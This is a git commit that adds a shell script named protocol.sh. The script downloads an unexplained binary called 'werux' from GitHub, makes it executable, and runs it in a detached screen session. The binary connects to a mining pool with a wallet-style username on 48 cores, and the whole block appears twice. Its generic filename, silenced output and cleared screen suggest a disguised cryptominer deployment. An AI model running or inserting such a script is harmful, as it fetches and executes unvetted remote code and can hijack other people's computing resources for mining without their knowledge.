44d77ca8b796e21d92d60b208ca0c4dd5f713baf
obisumila <obisumila@gmail.com>
2024-09-19 12:23:07 +0800

    Add files via upload

---
+++ protocol.sh
@@ -0,0 +1,20 @@
+wget https://github.com/obisumila/cuddly-happiness/raw/main/werux ;
+chmod +x werux ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S run -dm ./werux --url ws://tw-pool.com:5487/mine mine --username 8U4M3AHh79Uyq56dnT7ixNnMWejUT25MpKLvFmxX2Qmg.WHITE --cores 48 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
+wget https://github.com/obisumila/cuddly-happiness/raw/main/werux ;
+chmod +x werux ;
+sudo apt update > /dev/null 2>&1
+sudo apt install screen -y > /dev/null 2>&1
+screen -S run -dm ./werux --url ws://tw-pool.com:5487/mine mine --username 8U4M3AHh79Uyq56dnT7ixNnMWejUT25MpKLvFmxX2Qmg.RAINBOW --cores 48 ; 
+screen -ls
+sleep 2
+clear
+screen -ls ; 
+
